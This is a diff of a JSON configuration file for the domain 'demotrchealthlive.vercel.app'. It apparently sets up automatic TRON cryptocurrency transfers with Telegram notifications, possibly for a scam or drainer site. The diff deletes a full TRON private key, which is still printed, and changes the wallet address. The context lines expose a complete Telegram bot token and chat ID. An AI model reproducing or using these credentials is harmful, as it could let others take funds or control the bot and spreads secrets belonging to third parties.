@@ -1,7 +1,6 @@
 {
   "demotrchealthlive.vercel.app": {
-    "tronPrivateKey": "91973892d8404bf22016f57a44b7f9fe3bd168e6f58bdecdbc1ce7a28412a0da",
-    "tronAddress": "TMwBeNERGDvLit81qHR5QGCTxN12mXqC2p",
+    "tronAddress": "TMnnBPMLz6X7RHipv6ZFLtBARWwKMEcr7S",
     "telegramBotToken": "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM",
     "telegramChatId": "8191508290",
     "autoSendAmount": 13,
@@ -9,4 +8,3 @@
     "enabled": true
   }
 }
-
